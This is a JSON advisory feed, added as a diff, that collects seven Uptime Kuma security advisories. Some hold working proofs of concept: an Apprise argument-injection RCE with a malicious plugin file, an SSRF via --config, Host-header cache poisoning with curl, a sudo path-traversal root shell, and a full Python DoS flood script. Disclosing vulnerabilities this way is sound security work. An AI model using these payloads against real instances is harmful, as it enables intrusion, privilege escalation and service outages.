@@ -1,0 +1,415 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T02:25:17Z",
+  "product": {
+    "slug": "uptime-kuma",
+    "name": "Uptime Kuma",
+    "category": "monitoring",
+    "homepage": "https://uptime.kuma.pet",
+    "version_scheme": "semver",
+    "branches": []
+  },
+  "advisories": [
+    {
+      "id": "GHSA-v2p3-6f5h-6hhf",
+      "aliases": [],
+      "title": "Authenticated RCE via Apprise CLI Argument Injection (Missing -- Separator)",
+      "summary": "### Summary\r\n\r\n The Apprise notification provider passes user-controlled appriseURL directly as a CLI argument to spawn(\"apprise\", ...) without a -- separator. Any authenticated user can inject arbitrary CLI flags, including --plugin-path which loads and executes arbitrary Python files. Combined with any file-write primitive, this results in full RCE. Additionally, --config=URL enables authenticated SSRF. Argument injection confirmed on production (--help, --version return success; --config fetches external URLs; --plugin-path scans directories).\r\n\r\n### Details\r\n\r\nIn server/notification-providers/apprise.js lines 13-18:\r\n\r\n    const args = [\"-vv\", \"-b\", msg, notification.appriseURL];\r\n    const s = await childProcessAsync.spawn(\"apprise\", args, { encoding: \"utf8\" });\r\n\r\n  No -- separator before user input. Values starting with - are parsed as CLI flags by Apprise's click argument parser.\r\n\r\n  --plugin-path=DIR scans for .py files and imports them as Python modules. Python executes module-level code at import time - before any notification URL validation. RCE fires even though Apprise exits with \"no URLs\" error.\r\n\r\n  Fix: add \"--\" before notification.appriseURL (one line).\r\n\r\n### Proof of concept\r\n\r\nLocal reproduction (confirmed):\r\n\r\n  mkdir -p /tmp/evil\r\n  echo 'import os;os.system(\"id>/tmp/pwned.txt\")' > /tmp/evil/pwn.py\r\n\r\n  # Simulate exact UK spawn:\r\n  node -e \"require('child_process').spawn('apprise',\r\n    ['-vv','-b','Test','--plugin-path=/tmp/evil'])\r\n    .on('close',()=>console.log(\r\n      require('fs').readFileSync('/tmp/pwned.txt','utf8')))\"\r\n\r\n  Output: uid=1000(sol) gid=1000(sol) groups=1000(sol)\r\n\r\nProduction testing (authorized pentest, UK 2.5.3 Docker):\r\n  appriseURL=\"--help\"    → ok=true \"Sent Successfully\" (flag parsed)\r\n  appriseURL=\"--version\" → ok=true \"Sent Successfully\" (flag parsed)\r\n  appriseURL=\"--config=https://webhook.site/REDACTED\" → Apprise POSTed to URL (SSRF)\r\n  appriseURL=\"--plugin-path=/tmp\" → exit 1, directory scanned\r\n\r\nAutomated PoC via socket.io:\r\n\r\n  sock.emit(\"testNotification\", {\r\n    type: \"apprise\",\r\n    name: \"rce\",\r\n    appriseURL: \"--plugin-path=/tmp/evil\",\r\n  }, callback);\r\n  // RCE executes before callback returns\r\n\r\n\r\n### Impact\r\n\r\nWith any file-write access: full RCE as UK process user. Read database, dump env vars (API keys, DB passwords), reverse shell, container escape if Docker socket mounted, persistent backdoor.\r\n\r\nWithout file-write: authenticated SSRF via --config=URL (confirmed - Apprise fetches arbitrary URLs from server IP).\r\n\r\nThe vulnerability is in the argument parsing, not in Apprise itself. Fix is one line: add \"--\" before user input.",
+      "published_at": "2026-11-02T05:54:44.000Z",
+      "modified_at": "2026-11-02T05:54:44.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:P/VC:H/VI:H/VA:L/SC:H/SI:H/SA:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-88"
+      ],
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "1.0.6",
+              "fixed": "2.5.8"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v2p3-6f5h-6hhf",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v2p3-6f5h-6hhf",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v2p3-6f5h-6hhf",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:8aa421cddf6f0abf9d5cf6b21ce488081be0c02b5f2cc4de484ef0fb3e96efc5",
+      "note": null
+    },
+    {
+      "id": "GHSA-86ch-2247-gr56",
+      "aliases": [],
+      "title": "Unauthenticated Host-header injection and RSS cache poisoning",
+      "summary": "### Summary\r\n\r\nGET /status/:slug/rss builds the RSS <channel><link> from the request's Host header\r\n(StatusPage.buildRSSUrl in server/model/status_page.js). The response is cached for\r\n5 minutes by apicache, whose key is only req.originalUrl; it does not include Host and\r\ndoes not send Vary: Host.\r\n\r\nAn unauthenticated attacker can request the public RSS URL with Host: attacker.example,\r\npoisoning the shared cache. For the next 5 minutes, every client that fetches the same\r\nRSS URL receives a channel link pointing to the attacker's domain. The window can be\r\nrenewed by re-priming. This is link/content spoofing (phishing, brand impersonation),\r\nnot XSS; the feed library XML-escapes the value.\r\n\r\n### Details\r\n\r\nAffected code:\r\n- server/model/status_page.js, buildRSSUrl(): uses request.get(\"host\") to build the link.\r\n- server/routers/status-page-router.js: router.get(\"/status/:slug/rss\", cache(\"5 minutes\"), ...)\r\n  with no Vary: Host.\r\n- server/modules/apicache/apicache.js: cache key = req.originalUrl; Host is not included.\r\n\r\nPreconditions:\r\n- Default installation; trustProxy is not required (works with it off).\r\n- A public status page slug exists (it is a public URL by design).\r\n- Victim fetches /status/<slug>/rss within the 5-minute TTL.\r\n\r\nAffected versions: 2.5.8 (current \"2\" image). The same code path is present on master.\r\nIf trustProxy is enabled, X-Forwarded-Host is also spoofable.\r\n\r\nNo XSS/RCE: the feed library XML-escapes the value. Only the RSS output is affected;\r\nHTML SSR and /api/status-page/* bodies are not Host-dependent (tested).\r\n\r\n### Proof of concept\r\n\r\n1) Prime the cache with an attacker Host:\r\n\r\n   GET /status/hunt-status/rss HTTP/1.1\r\n   Host: canonical-evil.example\r\n\r\n   Response contains:\r\n   <link>http://canonical-evil.example/status/hunt-status</link>\r\n\r\n   curl -sS -H 'Host: canonical-evil.example' \\\r\n     http://127.0.0.1:3001/status/hunt-status/rss\r\n\r\n2) Fetch the same URL with the normal Host:\r\n\r\n   GET /status/hunt-status/rss HTTP/1.1\r\n   Host: 127.0.0.1:3001\r\n\r\n   The body still contains http://canonical-evil.example/status/hunt-status,\r\n   served from the shared cache.\r\n\r\n3) Independent network namespace (also confirms it is not a local-cookie effect):\r\n\r\n   docker run --rm --network host alpine:latest \\\r\n     sh -c \"wget -q -O - 'http://127.0.0.1:3001/status/hunt-status/rss'\"\r\n\r\n   Same evil link.\r\n\r\nConfirmed in two independent prime→victim rounds, including after the canonical URL's\r\nTTL expired; an unprimed control returned the normal URL. Replace \"hunt-status\" with\r\nany public status page slug. Raw HTTP/headers/logs are in the attached zip.\r\n\r\n### Impact\r\n\r\n- Pre-auth attacker redirects the RSS channel link (and any item links derived from it)\r\n  to an attacker domain; feed-reader \"open site\" clicks go to the attacker\r\n  (phishing / brand impersonation).\r\n- Poisoning lasts 5 minutes and can be renewed indefinitely; all clients share the\r\n  in-process cache.\r\n- No XSS, RCE, or data disclosure. Only the RSS output is affected.\r\n\r\nCVSS 4.0: 5.3 Medium\r\nCVSS 3.1: 4.3 Medium",
+      "published_at": "2026-10-31T15:55:27.000Z",
+      "modified_at": "2026-10-31T15:55:27.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "2.1.0",
+              "fixed": "2.5.9"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-86ch-2247-gr56",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-86ch-2247-gr56",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-86ch-2247-gr56",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:84fbb41977bb632b88c9d87e733a8a478e127390a317664ab2932a60887009a5",
+      "note": null
+    },
+    {
+      "id": "GHSA-98hr-q8q8-5j23",
+      "aliases": [],
+      "title": "Rootless privilege escalation",
+      "summary": "### Summary\r\n\r\nUsing the rootless containers, it is trivially easy to get root; this negates most of the security benefits and importantly misleads the user into thinking that rootless is safe which might lead to them securing it less / giving it more access to things under the bad assumption that it is safe.\r\n\r\n### Details\r\n\r\nThis is caused by:\r\n1. Rootless containers allow the node user to run `sudo` for a few commands\r\n2. In /etc/sudoers, the commands allowed do not restrict their arguments or anything, allowing for arbitrary usage of them\r\n3. `service`, permitted by sudo without a password, allows arbitrary code execution due to path traversal\r\n\r\nA possible quick fix for this would be only allowing sudo to run `service` with specific arguments rather than arbitrary invocations of it.\r\n\r\n### Proof of concept\r\n\r\nStart running `louislam/uptime-kuma:next-rootless` as a docker container named `uptime`. Then:\r\n```bash\r\n$ docker exec -it uptime sudo /usr/sbin/service ../../bin/sh\r\n```\r\n\r\n### Impact\r\n\r\nAnyone running rootless can be rooted, this negates the security benefits of rootless, and can be extra dangerous if users were extra-permissive with uptime kuma's permissions specifically because it was rootless",
+      "published_at": "2026-10-27T03:01:23.000Z",
+      "modified_at": "2026-10-27T03:01:23.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.5.6"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-98hr-q8q8-5j23",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-98hr-q8q8-5j23",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-98hr-q8q8-5j23",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adcbb12db4bcf21478f9629d13d6408bc1dc76c3c6b71312b9f8803c090eeb39",
+      "note": null
+    },
+    {
+      "id": "GHSA-wf2j-5mc7-5c4w",
+      "aliases": [],
+      "title": "Unauthenticated resource exhaustion DoS in ping badge endpoint via arbitrary monitor IDs",
+      "summary": "### Summary\r\nThe public endpoint GET /api/badge/:id/ping/:duration? performs expensive uptime calculator initialization for arbitrary monitor IDs before rejecting non-public or nonexistent monitors. An unauthenticated attacker can send many requests with unique fake monitor IDs, causing resource exhaustion and denial of service.  Once the service becomes unresponsive, all endpoints cease functioning for a time after the active attack ends (around 5-10 minutes in testing), not just the badge one.\r\n\r\n### Details\r\nIn server/routers/api-router.js:\r\n\r\nrouter.get(\"/api/badge/:id/ping/:duration?\", cache(\"5 minutes\"), async (request, response) => {\r\n    allowAllOrigin(response);\r\n    \r\n    ...\r\n    \r\n        const uptimeCalculator = await UptimeCalculator.getUptimeCalculator(requestedMonitorId);\r\n        const avgPing = uptimeCalculator.getDataByDuration(requestedDuration).avgPing; // XXX: This ties up resources\r\n\r\n        const badgeValues = { style };\r\n\r\n        if (!publicMonitor) {\r\n            // return a \"N/A\" badge in naColor (grey), if monitor is not public / not available / non exsitant\r\n\r\nShould check for public earlier, before doing anything expensive, and/or a quicker fail for invalid IDs.\r\n\r\n### PoC\r\n```\r\n#!/usr/bin/env python3\r\nimport time, urllib.request, concurrent.futures\r\n\r\nTARGET = \"http://127.0.0.1:3001\"\r\nTOTAL = 100_000\r\nCONCURRENCY = 100\r\nTIMEOUT = 5\r\nSTART_ID = 1_000_000_000\r\n\r\nok = fail = 0\r\nstart = time.perf_counter()\r\n\r\nprint(f\"Target: {TARGET}\")\r\nprint(f\"Requests: {TOTAL}, concurrency: {CONCURRENCY}\")\r\n\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as pool:\r\n    futures = [\r\n        pool.submit(\r\n            urllib.request.urlopen,\r\n            f\"{TARGET}/api/badge/{START_ID + i}/ping/24h\",\r\n            timeout=TIMEOUT,\r\n        )\r\n        for i in range(TOTAL)\r\n    ]\r\n\r\n    for n, fut in enumerate(concurrent.futures.as_completed(futures), 1):\r\n        try:\r\n            r = fut.result()\r\n            r.read(128)\r\n            r.close()\r\n            ok += 1\r\n        except Exception:\r\n            fail += 1\r\n\r\n        if n % 1000 == 0:\r\n            hstart = time.perf_counter()\r\n            try:\r\n                h = urllib.request.urlopen(f\"{TARGET}/api/entry-page\", timeout=TIMEOUT)\r\n                h.read(1)\r\n                h.close()\r\n                health = f\"health=ok time={time.perf_counter() - hstart:.2f}s\"\r\n            except Exception:\r\n                health = f\"health=FAIL time={TIMEOUT:.2f}s\"\r\n\r\n            print(\r\n                f\"{n}/{TOTAL} done \"\r\n                f\"ok={ok} fail={fail} \"\r\n                f\"wall={time.perf_counter() - start:.1f}s \"\r\n                f\"{health}\"\r\n            )\r\n\r\n```\r\nTail PoC output:\r\n53000/100000 done ok=53000 fail=0 wall=264.2s health=ok time=0.02s\r\n54000/100000 done ok=54000 fail=0 wall=273.8s health=ok time=0.02s\r\n55000/100000 done ok=55000 fail=0 wall=283.6s health=ok time=0.02s\r\n56000/100000 done ok=56000 fail=0 wall=293.5s health=ok time=0.02s\r\n57000/100000 done ok=56645 fail=355 wall=324.6s health=FAIL time=5.00s\r\n\r\n\r\n### Impact\r\nAny public Uptime Kuma instance can be DoSed.  The effect persists for several minutes after the active attack ends as well.  By the time the service goes down, it has grown about 600MB and is utilizing slightly more than 100% of one CPU.",
+      "published_at": "2026-10-09T02:30:47.000Z",
+      "modified_at": "2026-10-09T02:30:47.000Z",
+      "severity": {
+        "level": "high",
+        "score": 7.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.5.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-wf2j-5mc7-5c4w",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wf2j-5mc7-5c4w",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-wf2j-5mc7-5c4w",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:0c6fe17ab5bdfbee1b76e2d22a8e9b5ea1514f2f06a9d94fed3b8b35b4eaa202",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-33130",
+      "aliases": [
+        "GHSA-v832-4r73-wx5j"
+      ],
+      "title": "Uptime Kuma: SSTI in Notification Templates Allows Arbitrary File Read (Incomplete Fix for GHSA-vffh-c9pq-4crh)",
+      "summary": "Uptime Kuma is an open source, self-hosted monitoring tool. In versions 1.23.0 through 2.2.0, the fix from GHSA-vffh-c9pq-4crh doesn't fully work to preventServer-side Template Injection (SSTI). The three mitigations added to the Liquid engine (root, relativeReference, dynamicPartials) only block quoted paths. If a project uses an unquoted absolute path, attackers can still read any file on the server. The original fix in notification-provider.js only constrains the first two steps of LiquidJS's file resolution (via root, relativeReference, and dynamicPartials options), but the  third step, the require.resolve() fallback in liquid.node.js has no containment check, allowing unquoted absolute paths like /etc/passwd to resolve successfully. Quoted paths happen to be blocked only because the literal quote characters cause require.resolve('\"/etc/passwd\"') to throw a MODULE_NOT_FOUND error, not because of any intentional security measure. This issue has been fixed in version 2.2.1.",
+      "published_at": "2026-03-16T05:46:42.000Z",
+      "modified_at": "2026-03-20T21:18:35.209Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00387,
+        "percentile": 0.33285,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-98",
+        "CWE-1336"
+      ],
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "1.23.0",
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v832-4r73-wx5j",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-vffh-c9pq-4crh",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/louislam/uptime-kuma/releases/tag/2.2.1",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-33130",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-33130",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-33130",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-33130",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-v832-4r73-wx5j",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-v832-4r73-wx5j",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:80ffc29ca9b513d43840ea46003ec696459e5134d28ea08e0cd54d7b891b6ba0",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-32230",
+      "aliases": [
+        "GHSA-c7hf-c5p5-5g6h"
+      ],
+      "title": "Uptime Kuma is Missing Authorization Checks on Ping Badge Endpoint, Leaks Ping times of monitors without needing to be on a status page",
+      "summary": "Uptime Kuma is an open source, self-hosted monitoring tool. From 2.0.0 to 2.1.3 , the GET /api/badge/:id/ping/:duration? endpoint in server/routers/api-router.js does not verify that the requested monitor belongs to a public group. All other badge endpoints check AND public = 1 in their SQL query before returning data. The ping endpoint skips this check entirely, allowing unauthenticated users to extract average ping/response time data for private monitors. This vulnerability is fixed in 2.2.0.",
+      "published_at": "2026-03-11T06:52:49.000Z",
+      "modified_at": "2026-03-13T16:19:12.948Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00981,
+        "percentile": 0.62793,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.2.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-c7hf-c5p5-5g6h",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/louislam/uptime-kuma/issues/7038",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/louislam/uptime-kuma/issues/7135",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/louislam/uptime-kuma/commit/303a609c05d0b174a5045c90f53c2b557d4febae",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/louislam/uptime-kuma/releases/tag/2.2.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-32230",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-32230",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-32230",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-32230",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-c7hf-c5p5-5g6h",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-c7hf-c5p5-5g6h",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:07b9682507634f0e5fb7853f73e1db0c4f6b1e0bb5767d2f8bae88efb0cc23dc",
+      "note": null
+    },
+    {
+      "id": "GHSA-9fg7-wgm7-57fh",
+      "aliases": [],
+      "title": "RSS status feed does not set content type, leading to a Stored XSS in Public Status Page RSS Feed via CDATA escaped Monitor Name IF USING AN UNSECURE CLIENT",
+      "summary": "### Summary\r\n\r\nThe RSS feed for public status pages returns a default `text/html` content type instead of a safe RSS/XML content type. Monitor names are already CDATA-escaped, so the content itself is safe. However, serving the feed as `text/html` can cause browsers to interpret it incorrectly, potentially exposing users to cross-site scripting if the feed is embedded in a web context.\r\n\r\n### Description\r\n\r\nMonitor names are stored safely and rendered within CDATA sections in RSS feed items. The feed is generated dynamically and returned using `response.send()`. Because no explicit content type is set, the response defaults to `text/html`.\r\n\r\nWhile the content is already escaped, serving it as HTML can cause browsers to parse the feed incorrectly, possibly leading to **script execution in certain contexts**, such as embedded feed readers or if the feed is opened directly in a browser. Setting the correct RSS/XML content type ensures browsers interpret the feed safely and reduces risk.\r\n\r\n### Affected Code\r\n\r\n```js\r\n// server/model/status_page.js\r\nresponse.send(await StatusPage.renderRSS(statusPage, slug));\r\n// No Content-Type override (defaults to text/html)\r\n```\r\n\r\n### Impact\r\n\r\n* Incorrect content type can lead to unsafe rendering in some browsers or feed readers\r\n* Low likelihood of XSS due to CDATA escaping, but setting a proper type mitigates potential risk\r\n* Affects anyone consuming the RSS feed in a browser context\r\n\r\nSeverity is assessed as **Low**, since user content is already escaped and the risk requires a specific client behavior.\r\n\r\n### Recommended Fix\r\n\r\n* Explicitly set the content type to a safe RSS/XML type:\r\n\r\n```js\r\nresponse.type('application/rss+xml');\r\n```\r\n\r\n* Ensure all user-controlled content remains properly escaped in CDATA sections\r\n* Optionally, apply a Content Security Policy (CSP) to further mitigate browser risks\r\n\r\n### CWE\r\n\r\n* **CWE-116** - Improper Encoding or Escaping of Output\r\n\r\n### References\r\n\r\n* OWASP XSS Prevention Cheat Sheet - CDATA in XML/RSS\r\n* RFC 822 / RSS Security Considerations\r\n\r\n### Credits\r\n\r\nReported by: Bugbunny.ai",
+      "published_at": "2026-02-08T15:49:41.000Z",
+      "modified_at": "2026-02-08T15:49:41.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "uptime-kuma",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-9fg7-wgm7-57fh",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-9fg7-wgm7-57fh",
+          "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-9fg7-wgm7-57fh",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:a3ba11398f78c805050796481e8de5a96ab410eeef1aa3a2c9d8e489a51a9c49",
+      "note": null
+    }
+  ]
+}
